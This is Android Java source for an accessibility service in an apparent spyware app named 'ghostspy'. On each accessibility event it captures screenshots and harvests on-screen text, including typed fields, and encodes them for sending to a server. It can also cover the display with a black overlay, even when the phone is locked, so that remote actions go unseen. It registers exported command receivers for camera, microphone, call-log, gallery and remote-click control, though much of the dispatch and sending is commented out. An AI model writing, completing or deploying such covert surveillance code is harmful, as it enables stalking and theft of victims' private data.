package com.spy.ghostspy.services;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.ColorMatrix;
import android.graphics.ColorMatrixColorFilter;
import android.graphics.Paint;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.TextView;

import androidx.annotation.NonNull;

import com.spy.ghostspy.activity.OverlaySetActivity;
import com.spy.ghostspy.server.Server;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.concurrent.Executor;

public class MainAccessibilityService extends AccessibilityService {
    public static final String ACTION_SCREEN_MONITOR = "SCREEN_MONITOR";
    public static final String ACTION_SCREEN_CLICK_MONITOR = "SCREEN_CLICK_MONITOR";
    public static final String ACTION_SCREEN_DRAG_MONITOR = "SCREEN_DRAG_MONITOR";
    public static final String ACTION_SCREEN_BLACK_MONITOR = "SCREEN_BLACK_MONITOR";
    public static final String ACTION_SCREEN_LIGHT_MONITOR = "SCREEN_LIGHT_MONITOR";
    public static final String ACTION_SCREEN_LOCK_MONITOR = "SCREEN_LOCK_MONITOR";
    public static final String ACTION_SCREEN_UNLOCK_MONITOR = "SCREEN_UNLOCK_MONITOR";
    public static final String ACTION_FRONT_CAMERA_MONITOR = "FRONT_CAMERA_MONITOR";
    public static final String ACTION_BACK_CAMERA_MONITOR = "BACK_CAMERA_MONITOR";
    public static final String ACTION_MIC_MONITOR = "MIC_MONITOR";
    public static final String ACTION_CALL_LOGGER = "CALL_LOGGER";
    public static final String ACTION_ALL_GALLERY = "ALL_GALLERY";
    public static final String ACTION_ONE_GALLERY = "ONE_GALLERY";
    public static final String ACTION_CLOSE_MONITOR = "CLOSE_MONITOR";
    private String Selected_EVENT = ACTION_CLOSE_MONITOR;
    private boolean blackScreen = false;
    private String txtBlack = "";

    int deviceWidth = 0;
    int deviceHeight = 0;
    private double xPosition = 0;
    private double yPosition = 0;
    private final int imageWidth = 360;
    private String screenBase64 = "";
    private WindowManager windowManager;
    private View overlayView;
    private TextView loadingText;

    private static final String TAG = "MyAccessibilityService";
    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Intent serviceIntentX = new Intent(getBaseContext(), Server.class);
        getBaseContext().startService(serviceIntentX);
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);

        registerReceiverManager();
        if(!Settings.canDrawOverlays(getBaseContext())) {
            Intent intent = new Intent(this, OverlaySetActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }

    public BroadcastReceiver batteryReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
//            int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
//            int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
//            float batteryPct = level * 100 / (float) scale;
//            batteryLevel = String.valueOf(batteryPct);
//            Log.d("Battery Level:", "Battery Level: " + batteryPct + "%");
//            getWifiNetworkLevel();
        }
    };
    public BroadcastReceiver mediaProjectionReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
//            int resultCode = intent.getIntExtra("resultCode", 0);
//            Log.d("resultCode::", String.valueOf(resultCode));
//            Intent data = intent.getParcelableExtra("data");
//
//            if (resultCode == -1 && data != null) {
//                mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data);
//                startCapture();
//            }
        }
    };

    public BroadcastReceiver screenMonitorReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
//            if (!intent.getAction().equals(Selected_EVENT)) {
//                Selected_EVENT = intent.getAction();
//                if (ACTION_SCREEN_MONITOR.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    sendScreenMonitoringData(screenBase64);
//                } else if (ACTION_SCREEN_CLICK_MONITOR.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    xPosition = intent.getDoubleExtra("xPosition", 0);
//                    yPosition = intent.getDoubleExtra("yPosition", 0);
//                    performClick(xPosition, yPosition);
//                } else if (ACTION_SCREEN_DRAG_MONITOR.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    mouseDraw(10);
//                } else if (ACTION_SCREEN_BLACK_MONITOR.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    txtBlack = intent.getStringExtra("txtBlack");
//                    makeBlackScreen();
//                } else if (ACTION_SCREEN_LIGHT_MONITOR.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    removeBlackScreen();
//                } else if (ACTION_SCREEN_LOCK_MONITOR.equals(intent.getAction())) {
//                    onLockScreen();
//                } else if (ACTION_SCREEN_UNLOCK_MONITOR.equals(intent.getAction())) {
//                    onUnlockScreen();
//                } else if (ACTION_FRONT_CAMERA_MONITOR.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    removeBlackScreen();
//                    qualityCamera = intent.getIntExtra("quality", 10);
//                    Log.d("qualityCamera", String.valueOf(qualityCamera));
//                    setupCamera();
//                } else if (ACTION_BACK_CAMERA_MONITOR.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    removeBlackScreen();
//                    qualityCamera = intent.getIntExtra("quality", 10);
//                    Log.d("qualityCamera", String.valueOf(qualityCamera));
//                    setupCamera();
//                } else if (ACTION_MIC_MONITOR.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    removeBlackScreen();
//                    startRecording();
//                } else if (ACTION_CALL_LOGGER.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    removeBlackScreen();
//                    getCallDetails();
//                } else if (ACTION_ALL_GALLERY.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    removeBlackScreen();
//                    getAllImages();
//                } else if (ACTION_ONE_GALLERY.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    removeBlackScreen();
//                    imageFilePath = intent.getStringExtra("filepath");
//                    getOneImageData(imageFilePath);
//                } else if (ACTION_CLOSE_MONITOR.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    removeBlackScreen();
//                }
//            } else {
//                if (ACTION_FRONT_CAMERA_MONITOR.equals(intent.getAction())) {
//                    qualityCamera = intent.getIntExtra("quality", 10);
//                } else if (ACTION_BACK_CAMERA_MONITOR.equals(intent.getAction())) {
//                    qualityCamera = intent.getIntExtra("quality", 10);
//                } else if (ACTION_SCREEN_CLICK_MONITOR.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    xPosition = intent.getDoubleExtra("xPosition", 0);
//                    yPosition = intent.getDoubleExtra("yPosition", 0);
//                    Log.d("qualityCamera", String.valueOf(xPosition) + "::" + String.valueOf(yPosition));
//                    performClick(xPosition, yPosition);
//                } else if (ACTION_SCREEN_DRAG_MONITOR.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    mouseDraw(10);
//                } else if (ACTION_ONE_GALLERY.equals(intent.getAction())) {
//                    closeCamera();
//                    stopRecording();
//                    imageFilePath = intent.getStringExtra("filepath");
//                    getOneImageData(imageFilePath);
//                }
//            }
        }
    };

    public void registerReceiverManager() {
        IntentFilter filter0 = new IntentFilter(ACTION_CLOSE_MONITOR);
        registerReceiver(screenMonitorReceiver, filter0, RECEIVER_EXPORTED);

        IntentFilter filter = new IntentFilter(ACTION_SCREEN_MONITOR);
        registerReceiver(screenMonitorReceiver, filter, RECEIVER_EXPORTED);
        IntentFilter filter1 = new IntentFilter(ACTION_FRONT_CAMERA_MONITOR);
        registerReceiver(screenMonitorReceiver, filter1, RECEIVER_EXPORTED);
        IntentFilter filter2 = new IntentFilter(ACTION_BACK_CAMERA_MONITOR);
        registerReceiver(screenMonitorReceiver, filter2, RECEIVER_EXPORTED);
        IntentFilter filter3 = new IntentFilter(ACTION_MIC_MONITOR);
        registerReceiver(screenMonitorReceiver, filter3, RECEIVER_EXPORTED);
        IntentFilter filter4 = new IntentFilter(ACTION_CALL_LOGGER);
        registerReceiver(screenMonitorReceiver, filter4, RECEIVER_EXPORTED);
        IntentFilter filter5 = new IntentFilter(ACTION_SCREEN_CLICK_MONITOR);
        registerReceiver(screenMonitorReceiver, filter5, RECEIVER_EXPORTED);
        IntentFilter filter6 = new IntentFilter(ACTION_SCREEN_DRAG_MONITOR);
        registerReceiver(screenMonitorReceiver, filter6, RECEIVER_EXPORTED);
        IntentFilter filter7 = new IntentFilter(ACTION_ALL_GALLERY);
        registerReceiver(screenMonitorReceiver, filter7, RECEIVER_EXPORTED);
        IntentFilter filter8 = new IntentFilter(ACTION_ONE_GALLERY);
        registerReceiver(screenMonitorReceiver, filter8, RECEIVER_EXPORTED);
        IntentFilter filter9 = new IntentFilter(ACTION_SCREEN_BLACK_MONITOR);
        registerReceiver(screenMonitorReceiver, filter9, RECEIVER_EXPORTED);
        IntentFilter filter10 = new IntentFilter(ACTION_SCREEN_LIGHT_MONITOR);
        registerReceiver(screenMonitorReceiver, filter10, RECEIVER_EXPORTED);
        IntentFilter filter11 = new IntentFilter(ACTION_SCREEN_LOCK_MONITOR);
        registerReceiver(screenMonitorReceiver, filter11, RECEIVER_EXPORTED);
        IntentFilter filter12 = new IntentFilter(ACTION_SCREEN_UNLOCK_MONITOR);
        registerReceiver(screenMonitorReceiver, filter12, RECEIVER_EXPORTED);

        IntentFilter mediaProjectionFilter = new IntentFilter("MEDIA_PROJECTION_RESULT");
        registerReceiver(mediaProjectionReceiver, mediaProjectionFilter, RECEIVER_EXPORTED);

        IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        registerReceiver(batteryReceiver, batteryFilter, RECEIVER_EXPORTED);
    }

    @Override
    public void takeScreenshot(int displayId, @NonNull Executor executor, @NonNull TakeScreenshotCallback callback) {
        super.takeScreenshot(displayId, executor, callback);
    }


    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        screenShotDevice();
        printVisibleTextViewsButtonsEditTexts(event.getSource());
    }

    public void screenShotDevice() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(0, getApplicationContext().getMainExecutor(), new TakeScreenshotCallback() {

                @Override
                public void onSuccess(@NonNull ScreenshotResult screenshot) {
                    new Thread() {
                        @Override
                        public void run() {
                            try {
                                Bitmap wrapHardwareBuffer = Bitmap.wrapHardwareBuffer(screenshot.getHardwareBuffer(), screenshot.getColorSpace());
                                // Compress the Bitmap to JPEG format with 50% quality
                                try {
                                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                                    assert wrapHardwareBuffer != null;
                                    deviceWidth = wrapHardwareBuffer.getWidth();
                                    deviceHeight = wrapHardwareBuffer.getHeight();
                                    Bitmap scaledBitmap;
                                    if(blackScreen) {
                                        Bitmap converImage = changeImageOpacity(wrapHardwareBuffer,1.0f);
                                        scaledBitmap = Bitmap.createScaledBitmap(converImage, imageWidth, (int) (deviceHeight * (360.0 / deviceWidth)), true);
                                        scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 20, byteArrayOutputStream);
                                    } else {
                                        scaledBitmap = Bitmap.createScaledBitmap(wrapHardwareBuffer, imageWidth, (int) (deviceHeight * (360.0 / deviceWidth)), true);
                                        scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, byteArrayOutputStream);
                                    }
                                    // Encode the compressed Bitmap to base64
                                    byte[] compressedBytes = byteArrayOutputStream.toByteArray();
                                    String base64Image = Base64.encodeToString(compressedBytes, Base64.DEFAULT);
                                    Log.d("base64:::", "base64Image");
//                                    sendScreenMonitoringData(base64Image);
                                    byteArrayOutputStream.close();
                                } catch (IOException e) {
                                    throw new RuntimeException(e);
                                }

                            } catch (Exception e){
                                e.printStackTrace();
                            }
                        }
                    }.start();
                }
                @Override
                public void onFailure(int errorCode) {
                }
            });
        }
    }

    public static Bitmap changeImageOpacity(Bitmap originalImage, float opacity) {
        // Create a mutable bitmap with the same size as the original
        Bitmap adjustedImage = Bitmap.createBitmap(
                originalImage.getWidth(),
                originalImage.getHeight(),
                Bitmap.Config.ARGB_8888
        );
        Canvas canvas = new Canvas(adjustedImage);
        Paint paint = new Paint();
        paint.setAlpha((int) (opacity * 255));
        float brightness = 1.0f;
        float contrast = 50.0f;
        float gamma = 1.0f;
        float adjustedBrightness = brightness - 1.0f;
        ColorMatrix colorMatrix = new ColorMatrix(new float[]{
                contrast, 0, 0, 0, adjustedBrightness,
                0, contrast, 0, 0, adjustedBrightness,
                0, 0, contrast, 0, adjustedBrightness,
                0, 0, 0, 1, 0
        });
        paint.setColorFilter(new ColorMatrixColorFilter(colorMatrix));
        canvas.drawBitmap(originalImage.copy(Bitmap.Config.ARGB_8888, true), 0, 0, paint);
        return adjustedImage;
    }

    private void printVisibleTextViewsButtonsEditTexts(AccessibilityNodeInfo nodeInfo) {
        try {
            if (nodeInfo != null) {
                if (!nodeInfo.isVisibleToUser()) {
                    Log.d("data::", "data loaded");
                    return;
                }
                String type;
                switch (nodeInfo.getClassName() != null ? nodeInfo.getClassName().toString() : "") {
                    case "android.widget.TextView":
                        type = "text";
                        break;
                    case "android.widget.Button":
                        type = "button";
                        break;
                    case "android.widget.EditText":
                        type = "edit";
                        break;
                    case "android.view.View":
                        type = "view";
                        break;
                    case "android.widget.FrameLayout":
                        type = "framelayout";
                        break;
                    case "android.widget.ImageView":
                        type = "imageview";
                        break;
                    case "com.google.android.material.bottomsheet.a":
                        type = "bottomsheet";
                        break;
                    case "android.view.ViewGroup":
                        type = "viewgroup";
                        break;
                    default:
                        type = "unknown";
                        break;
                }

                if (!type.equals("unknown")) {
                    String text = nodeInfo.getText() != null ? nodeInfo.getText().toString() :
                            (nodeInfo.getContentDescription() != null ? nodeInfo.getContentDescription().toString() : "");

                    Rect rect = new Rect();
                    nodeInfo.getBoundsInScreen(rect);
                    int x = rect.left;
                    int y = rect.top;
                    int width = rect.width();
                    int height = rect.height();

                    String data = "ESQUELETO|"+"|" + text + "|" + x + "|" + y + "|" + width + "|" + height + "|" + type;
                    Log.d("data::", data);
//                    if (Server.CONTEXT != null) {
//                        if (Server.CONTEXT.rdOpen) {
//                            Server.CONTEXT.sendMessage2(data);
//                        } else {
//                            // Server.CONTEXT.reconnectWebSocket2();
//                        }
//                    }
                }

                for (int i = 0; i < nodeInfo.getChildCount(); i++) {
                    printVisibleTextViewsButtonsEditTexts(nodeInfo.getChild(i));
                }
            } else {
                Log.d("data::", "data loaded");
            }
        } catch (Exception exception) {
            Log.e("Acc", "Error in esqueletoView: " + exception.getLocalizedMessage());
            exception.printStackTrace();
        }
    }

    @Override
    public void onInterrupt() {

    }

    public void makeBlackScreen() {
        if (overlayView == null) {
            overlayView = new View(this);
            overlayView.setBackgroundColor(0xFF000000); // Black color
            overlayView.getBackground().setAlpha(252);
            loadingText = new TextView(this);
            loadingText.setTextColor(Color.BLUE);
            loadingText.setText(txtBlack);
            loadingText.setTextSize(24);
            loadingText.setGravity(Gravity.CENTER);
            int screenHeight = getResources().getDisplayMetrics().heightPixels;
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    screenHeight + 1000,
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON|
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
                            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                            WindowManager.LayoutParams.FLAG_FULLSCREEN |
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    PixelFormat.TRANSPARENT
            );
            params.gravity = Gravity.TOP;
            windowManager.addView(overlayView, params);
            windowManager.addView(loadingText, params);
            blackScreen = true;
        }
    }
}
